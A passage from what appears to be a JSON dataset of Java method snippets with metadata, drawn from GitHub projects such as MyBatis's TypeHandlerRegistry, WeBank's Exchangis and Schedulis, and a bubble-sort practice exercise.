\u6392\u5e8f\u524d:\n\t\tSystem.out.println(Arrays.toString(ns));\n\t\t// TODO:\n\t\tfor (int i = 0; i < ns.length - 1; i++) {\n            for (int j = 0; j < ns.length - i - 1; j++) {\n                if (ns[j] < ns[j+1]) {\n                    // \u4ea4\u6362ns[j]\u548cns[j+1]:\n                    int tmp = ns[j];\n                    ns[j] = ns[j+1];\n                    ns[j+1] = tmp;\n                }\n            }\n        }\n\t\t// \u6392\u5e8f\u540e:\n\t\tSystem.out.println(Arrays.toString(ns));\n\t\tif (Arrays.toString(ns).equals(\"[96, 89, 73, 65, 50, 36, 28, 18, 12, 8]\")) {\n\t\t\tSystem.out.println(\"\u6d4b\u8bd5\u6210\u529f\");\n\t\t} else {\n\t\t\tSystem.out.println(\"\u6d4b\u8bd5\u5931\u8d25\");\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/IzzyPrime/JavaWorkspace/master/JavaPractice/part1/src/com/array/javapractice/ArraySort.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33083, "method_name": "getUsername", "class_name": "ExecSysUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUsername() {\n        return username;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecSysUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33084, "method_name": "setUsername", "class_name": "ExecSysUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUsername(String username) {\n        this.username = username;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecSysUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33085, "method_name": "getUid", "class_name": "ExecSysUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getUid() {\n        return uid;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecSysUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33086, "method_name": "setUid", "class_name": "ExecSysUser", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUid(Integer uid) {\n        this.uid = uid;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecSysUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33087, "method_name": "getGid", "class_name": "ExecSysUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getGid() {\n        return gid;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecSysUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33088, "method_name": "setGid", "class_name": "ExecSysUser", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGid(Integer gid) {\n        this.gid = gid;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecSysUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33089, "method_name": "setUp", "class_name": "InvalidNamedConstructorArgsTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {\n    // create an SqlSessionFactory\n    try (Reader reader = Resources.getResourceAsReader(\n        \"org/apache/ibatis/submitted/named_constructor_args/mybatis-config.xml\")) {\n      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n    }\n\n    // populate in-memory database\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n            \"org/apache/ibatis/submitted/named_constructor_args/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/named_constructor_args/InvalidNamedConstructorArgsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33090, "method_name": "noMatchingConstructorArgName", "class_name": "InvalidNamedConstructorArgsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void noMatchingConstructorArgName() {\n    Configuration configuration = sqlSessionFactory.getConfiguration();\n    when(() -> configuration.addMapper(NoMatchingConstructorMapper.class));\n\n    then(caughtException()).isInstanceOf(BuilderException.class)\n      .hasMessageContaining(\n          \"'org.apache.ibatis.submitted.named_constructor_args.InvalidNamedConstructorArgsTest$NoMatchingConstructorMapper.select-void'\")\n      .hasMessageContaining(\"'org.apache.ibatis.submitted.named_constructor_args.User'\")\n      .hasMessageContaining(\"[noSuchConstructorArg]\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/named_constructor_args/InvalidNamedConstructorArgsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33091, "method_name": "wrongJavaType", "class_name": "InvalidNamedConstructorArgsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void wrongJavaType() {\n    Configuration configuration = sqlSessionFactory.getConfiguration();\n    when(() -> configuration.addMapper(ConstructorWithWrongJavaType.class));\n    then(caughtException()).isInstanceOf(BuilderException.class)\n      .hasMessageContaining(\n          \"'org.apache.ibatis.submitted.named_constructor_args.InvalidNamedConstructorArgsTest$ConstructorWithWrongJavaType.select-void'\")\n      .hasMessageContaining(\"'org.apache.ibatis.submitted.named_constructor_args.User'\")\n      .hasMessageContaining(\"[id]\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/named_constructor_args/InvalidNamedConstructorArgsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33092, "method_name": "missingRequiredJavaType", "class_name": "InvalidNamedConstructorArgsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void missingRequiredJavaType() {\n    Configuration configuration = sqlSessionFactory.getConfiguration();\n    when(() -> configuration.addMapper(ConstructorMissingRequiresJavaType.class));\n    then(caughtException()).isInstanceOf(BuilderException.class)\n      .hasMessageContaining(\n            \"'org.apache.ibatis.submitted.named_constructor_args.InvalidNamedConstructorArgsTest$ConstructorMissingRequiresJavaType.select-void'\")\n      .hasMessageContaining(\"'org.apache.ibatis.submitted.named_constructor_args.User'\")\n      .hasMessageContaining(\"[id]\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/named_constructor_args/InvalidNamedConstructorArgsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33093, "method_name": "createFlowLoader", "class_name": "FlowLoaderFactory", "params": ["File"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "FlowLoader", "snippet": "  public FlowLoader createFlowLoader(final File projectDir) throws ProjectManagerException {\n    if (checkForValidProjectYamlFile(projectDir)) {\n      return new DirectoryYamlFlowLoader(this.props);\n    } else {\n      return new DirectoryFlowLoader(this.props);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/FlowLoaderFactory.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33094, "method_name": "checkForValidProjectYamlFile", "class_name": "FlowLoaderFactory", "params": ["File"], "throws": ["ProjectManagerException"], "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean checkForValidProjectYamlFile(final File projectDir) throws\n      ProjectManagerException {\n    final File[] projectFileList = projectDir.listFiles(new SuffixFilter(Constants\n        .PROJECT_FILE_SUFFIX));\n\n    if (projectFileList == null) {\n      throw new ProjectManagerException(\"Error reading project directory. Input is not a \"\n          + \"directory or IO error happens.\");\n    }\n\n    if (ArrayUtils.isNotEmpty(projectFileList)) {\n      if (projectFileList.length > 1) {\n        throw new ProjectManagerException(\"Duplicate project YAML files found in the project \"\n            + \"directory. Only one is allowed.\");\n      }\n\n      final Map<String, Object> azkabanProject;\n      try (FileInputStream fis = new FileInputStream(projectFileList[0])) {\n        azkabanProject = (Map<String, Object>) new Yaml().load(fis);\n      } catch (final IOException e) {\n        throw new ProjectManagerException(\"Error reading project YAML file.\", e);\n      }\n\n      if (azkabanProject == null || !azkabanProject\n          .containsKey(Constants.ConfigurationKeys.AZKABAN_FLOW_VERSION)) {\n        throw new ProjectManagerException(\"azkaban-flow-version is not specified in the project \"\n            + \"YAML file.\");\n      }\n\n      if (azkabanProject.get(Constants.ConfigurationKeys.AZKABAN_FLOW_VERSION).equals\n          (Constants.AZKABAN_FLOW_VERSION_2_0)) {\n        return true;\n      } else {\n        throw new ProjectManagerException(\"Invalid azkaban-flow-version in the project YAML file.\");\n      }\n    } else {\n      for (final File file : projectDir.listFiles(new DirFilter())) {\n        if (checkForValidProjectYamlFile(file)) {\n          return true;\n        }\n      }\n      return false;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/FlowLoaderFactory.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33095, "method_name": "setDefaultEnumTypeHandler", "class_name": "TypeHandlerRegistry", "params": ["Class<TypeHandler>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setDefaultEnumTypeHandler(Class<? extends TypeHandler> typeHandler) {\n    this.defaultEnumTypeHandler = typeHandler;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33096, "method_name": "hasTypeHandler", "class_name": "TypeHandlerRegistry", "params": ["Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasTypeHandler(Class<?> javaType) {\n    return hasTypeHandler(javaType, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33097, "method_name": "hasTypeHandler", "class_name": "TypeHandlerRegistry", "params": ["TypeReference<?>"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasTypeHandler(TypeReference<?> javaTypeReference) {\n    return hasTypeHandler(javaTypeReference, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33098, "method_name": "hasTypeHandler", "class_name": "TypeHandlerRegistry", "params": ["Class<?>", "JdbcType"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasTypeHandler(Class<?> javaType, JdbcType jdbcType) {\n    return javaType != null && getTypeHandler((Type) javaType, jdbcType) != null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33099, "method_name": "hasTypeHandler", "class_name": "TypeHandlerRegistry", "params": ["TypeReference<?>", "JdbcType"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasTypeHandler(TypeReference<?> javaTypeReference, JdbcType jdbcType) {\n    return javaTypeReference != null && getTypeHandler(javaTypeReference, jdbcType) != null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33100, "method_name": "getMappingTypeHandler", "class_name": "TypeHandlerRegistry", "params": ["Class<TypeHandler>"], "throws": null, "modifiers": ["public"], "return_type": "TypeHandler<?>", "snippet": "  public TypeHandler<?> getMappingTypeHandler(Class<? extends TypeHandler<?>> handlerType) {\n    return allTypeHandlersMap.get(handlerType);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33101, "method_name": "getTypeHandler", "class_name": "TypeHandlerRegistry", "params": ["Class<T>"], "throws": null, "modifiers": ["public"], "return_type": "TypeHandler<T>", "snippet": "  public <T> TypeHandler<T> getTypeHandler(Class<T> type) {\n    return getTypeHandler((Type) type, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33102, "method_name": "getTypeHandler", "class_name": "TypeHandlerRegistry", "params": ["TypeReference<T>"], "throws": null, "modifiers": ["public"], "return_type": "TypeHandler<T>", "snippet": "  public <T> TypeHandler<T> getTypeHandler(TypeReference<T> javaTypeReference) {\n    return getTypeHandler(javaTypeReference, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33103, "method_name": "getTypeHandler", "class_name": "TypeHandlerRegistry", "params": ["JdbcType"], "throws": null, "modifiers": ["public"], "return_type": "TypeHandler<?>", "snippet": "  public TypeHandler<?> getTypeHandler(JdbcType jdbcType) {\n    return jdbcTypeHandlerMap.get(jdbcType);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33104, "method_name": "getTypeHandler", "class_name": "TypeHandlerRegistry", "params": ["Class<T>", "JdbcType"], "throws": null, "modifiers": ["public"], "return_type": "TypeHandler<T>", "snippet": "  public <T> TypeHandler<T> getTypeHandler(Class<T> type, JdbcType jdbcType) {\n    return getTypeHandler((Type) type, jdbcType);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33105, "method_name": "getTypeHandler", "class_name": "TypeHandlerRegistry", "params": ["TypeReference<T>", "JdbcType"], "throws": null, "modifiers": ["public"], "return_type": "TypeHandler<T>", "snippet": "  public <T> TypeHandler<T> getTypeHandler(TypeReference<T> javaTypeReference, JdbcType jdbcType) {\n    return getTypeHandler(javaTypeReference.getRawType(), jdbcType);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33106, "method_name": "getTypeHandler", "class_name": "TypeHandlerRegistry", "params": ["Type", "JdbcType"], "throws": null, "modifiers": ["private"], "return_type": "TypeHandler<T>", "snippet": "  private <T> TypeHandler<T> getTypeHandler(Type type, JdbcType jdbcType) {\n    if (ParamMap.class.equals(type)) {\n      return null;\n    }\n    Map<JdbcType, TypeHandler<?>> jdbcHandlerMap = getJdbcHandlerMap(type);\n    TypeHandler<?> handler = null;\n    if (jdbcHandlerMap != null) {\n      handler = jdbcHandlerMap.get(jdbcType);\n      if (handler == null) {\n        handler = jdbcHandlerMap.get(null);\n      }\n      if (handler == null) {\n        // #591\n        handler = pickSoleHandler(jdbcHandlerMap);\n      }\n    }\n    // type drives generics here\n    return (TypeHandler<T>) handler;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33107, "method_name": "getJdbcHandlerMap", "class_name": "TypeHandlerRegistry", "params": ["Type"], "throws": null, "modifiers": ["private"], "return_type": "Map<JdbcType,TypeHandler>", "snippet": "  private Map<JdbcType, TypeHandler<?>> getJdbcHandlerMap(Type type) {\n    Map<JdbcType, TypeHandler<?>> jdbcHandlerMap = typeHandlerMap.get(type);\n    if (NULL_TYPE_HANDLER_MAP.equals(jdbcHandlerMap)) {\n      return null;\n    }\n    if (jdbcHandlerMap == null && type instanceof Class) {\n      Class<?> clazz = (Class<?>) type;\n      if (Enum.class.isAssignableFrom(clazz)) {\n        Class<?> enumClass = clazz.isAnonymousClass() ? clazz.getSuperclass() : clazz;\n        jdbcHandlerMap = getJdbcHandlerMapForEnumInterfaces(enumClass, enumClass);\n        if (jdbcHandlerMap == null) {\n          register(enumClass, getInstance(enumClass, defaultEnumTypeHandler));\n          return typeHandlerMap.get(enumClass);\n        }\n      } else {\n        jdbcHandlerMap = getJdbcHandlerMapForSuperclass(clazz);\n      }\n    }\n    typeHandlerMap.put(type, jdbcHandlerMap == null ? NULL_TYPE_HANDLER_MAP : jdbcHandlerMap);\n    return jdbcHandlerMap;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33108, "method_name": "getJdbcHandlerMapForEnumInterfaces", "class_name": "TypeHandlerRegistry", "params": ["Class<?>", "Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "Map<JdbcType,TypeHandler>", "snippet": "  private Map<JdbcType, TypeHandler<?>> getJdbcHandlerMapForEnumInterfaces(Class<?> clazz, Class<?> enumClazz) {\n    for (Class<?> iface : clazz.getInterfaces()) {\n      Map<JdbcType, TypeHandler<?>> jdbcHandlerMap = typeHandlerMap.get(iface);\n      if (jdbcHandlerMap == null) {\n        jdbcHandlerMap = getJdbcHandlerMapForEnumInterfaces(iface, enumClazz);\n      }\n      if (jdbcHandlerMap != null) {\n        // Found a type handler regsiterd to a super interface\n        HashMap<JdbcType, TypeHandler<?>> newMap = new HashMap<>();\n        for (Entry<JdbcType, TypeHandler<?>> entry : jdbcHandlerMap.entrySet()) {\n          // Create a type handler instance with enum type as a constructor arg\n          newMap.put(entry.getKey(), getInstance(enumClazz, entry.getValue().getClass()));\n        }\n        return newMap;\n      }\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33109, "method_name": "getJdbcHandlerMapForSuperclass", "class_name": "TypeHandlerRegistry", "params": ["Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "Map<JdbcType,TypeHandler>", "snippet": "  private Map<JdbcType, TypeHandler<?>> getJdbcHandlerMapForSuperclass(Class<?> clazz) {\n    Class<?> superclass =  clazz.getSuperclass();\n    if (superclass == null || Object.class.equals(superclass)) {\n      return null;\n    }\n    Map<JdbcType, TypeHandler<?>> jdbcHandlerMap = typeHandlerMap.get(superclass);\n    if (jdbcHandlerMap != null) {\n      return jdbcHandlerMap;\n    } else {\n      return getJdbcHandlerMapForSuperclass(superclass);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33110, "method_name": "pickSoleHandler", "class_name": "TypeHandlerRegistry", "params": ["Map<JdbcType,TypeHandler>"], "throws": null, "modifiers": ["private"], "return_type": "TypeHandler<?>", "snippet": "  private TypeHandler<?> pickSoleHandler(Map<JdbcType, TypeHandler<?>> jdbcHandlerMap) {\n    TypeHandler<?> soleHandler = null;\n    for (TypeHandler<?> handler : jdbcHandlerMap.values()) {\n      if (soleHandler == null) {\n        soleHandler = handler;\n      } else if (!handler.getClass().equals(soleHandler.getClass())) {\n        // More than one type handlers registered.\n        return null;\n      }\n    }\n    return soleHandler;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33111, "method_name": "getUnknownTypeHandler", "class_name": "TypeHandlerRegistry", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TypeHandler<Object>", "snippet": "  public TypeHandler<Object> getUnknownTypeHandler() {\n    return unknownTypeHandler;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33112, "method_name": "register", "class_name": "TypeHandlerRegistry", "params": ["JdbcType", "TypeHandler<?>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void register(JdbcType jdbcType, TypeHandler<?> handler) {\n    jdbcTypeHandlerMap.put(jdbcType, handler);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33113, "method_name": "register", "class_name": "TypeHandlerRegistry", "params": ["TypeHandler<T>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public <T> void register(TypeHandler<T> typeHandler) {\n    boolean mappedTypeFound = false;\n    MappedTypes mappedTypes = typeHandler.getClass().getAnnotation(MappedTypes.class);\n    if (mappedTypes != null) {\n      for (Class<?> handledType : mappedTypes.value()) {\n        register(handledType, typeHandler);\n        mappedTypeFound = true;\n      }\n    }\n    // @since 3.1.0 - try to auto-discover the mapped type\n    if (!mappedTypeFound && typeHandler instanceof TypeReference) {\n      try {\n        TypeReference<T> typeReference = (TypeReference<T>) typeHandler;\n        register(typeReference.getRawType(), typeHandler);\n        mappedTypeFound = true;\n      } catch (Throwable t) {\n        // maybe users define the TypeReference with a different type and are not assignable, so just ignore it\n      }\n    }\n    if (!mappedTypeFound) {\n      register((Class<T>) null, typeHandler);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33114, "method_name": "register", "class_name": "TypeHandlerRegistry", "params": ["Class<T>", "TypeHandler<T>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public <T> void register(Class<T> javaType, TypeHandler<? extends T> typeHandler) {\n    register((Type) javaType, typeHandler);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33115, "method_name": "register", "class_name": "TypeHandlerRegistry", "params": ["Type", "TypeHandler<T>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private <T> void register(Type javaType, TypeHandler<? extends T> typeHandler) {\n    MappedJdbcTypes mappedJdbcTypes = typeHandler.getClass().getAnnotation(MappedJdbcTypes.class);\n    if (mappedJdbcTypes != null) {\n      for (JdbcType handledJdbcType : mappedJdbcTypes.value()) {\n        register(javaType, handledJdbcType, typeHandler);\n      }\n      if (mappedJdbcTypes.includeNullJdbcType()) {\n        register(javaType, null, typeHandler);\n      }\n    } else {\n      register(javaType, null, typeHandler);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33116, "method_name": "register", "class_name": "TypeHandlerRegistry", "params": ["TypeReference<T>", "TypeHandler<T>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public <T> void register(TypeReference<T> javaTypeReference, TypeHandler<? extends T> handler) {\n    register(javaTypeReference.getRawType(), handler);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33117, "method_name": "register", "class_name": "TypeHandlerRegistry", "params": ["Class<T>", "JdbcType", "TypeHandler<T>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public <T> void register(Class<T> type, JdbcType jdbcType, TypeHandler<? extends T> handler) {\n    register((Type) type, jdbcType, handler);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33118, "method_name": "register", "class_name": "TypeHandlerRegistry", "params": ["Type", "JdbcType", "TypeHandler<?>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void register(Type javaType, JdbcType jdbcType, TypeHandler<?> handler) {\n    if (javaType != null) {\n      Map<JdbcType, TypeHandler<?>> map = typeHandlerMap.get(javaType);\n      if (map == null || map == NULL_TYPE_HANDLER_MAP) {\n        map = new HashMap<>();\n      }\n      map.put(jdbcType, handler);\n      typeHandlerMap.put(javaType, map);\n    }\n    allTypeHandlersMap.put(handler.getClass(), handler);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33119, "method_name": "register", "class_name": "TypeHandlerRegistry", "params": ["Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void register(Class<?> typeHandlerClass) {\n    boolean mappedTypeFound = false;\n    MappedTypes mappedTypes = typeHandlerClass.getAnnotation(MappedTypes.class);\n    if (mappedTypes != null) {\n      for (Class<?> javaTypeClass : mappedTypes.value()) {\n        register(javaTypeClass, typeHandlerClass);\n        mappedTypeFound = true;\n      }\n    }\n    if (!mappedTypeFound) {\n      register(getInstance(null, typeHandlerClass));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33120, "method_name": "register", "class_name": "TypeHandlerRegistry", "params": ["String", "String"], "throws": ["ClassNotFoundException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void register(String javaTypeClassName, String typeHandlerClassName) throws ClassNotFoundException {\n    register(Resources.classForName(javaTypeClassName), Resources.classForName(typeHandlerClassName));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33121, "method_name": "register", "class_name": "TypeHandlerRegistry", "params": ["Class<?>", "Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void register(Class<?> javaTypeClass, Class<?> typeHandlerClass) {\n    register(javaTypeClass, getInstance(javaTypeClass, typeHandlerClass));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33122, "method_name": "register", "class_name": "TypeHandlerRegistry", "params": ["Class<?>", "JdbcType", "Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void register(Class<?> javaTypeClass, JdbcType jdbcType, Class<?> typeHandlerClass) {\n    register(javaTypeClass, jdbcType, getInstance(javaTypeClass, typeHandlerClass));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33123, "method_name": "getInstance", "class_name": "TypeHandlerRegistry", "params": ["Class<?>", "Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "TypeHandler<T>", "snippet": "  public <T> TypeHandler<T> getInstance(Class<?> javaTypeClass, Class<?> typeHandlerClass) {\n    if (javaTypeClass != null) {\n      try {\n        Constructor<?> c = typeHandlerClass.getConstructor(Class.class);\n        return (TypeHandler<T>) c.newInstance(javaTypeClass);\n      } catch (NoSuchMethodException ignored) {\n        // ignored\n      } catch (Exception e) {\n        throw new TypeException(\"Failed invoking constructor for handler \" + typeHandlerClass, e);\n      }\n    }\n    try {\n      Constructor<?> c = typeHandlerClass.getConstructor();\n      return (TypeHandler<T>) c.newInstance();\n    } catch (Exception e) {\n      throw new TypeException(\"Unable to find a usable constructor for \" + typeHandlerClass, e);\n    }\n  }", 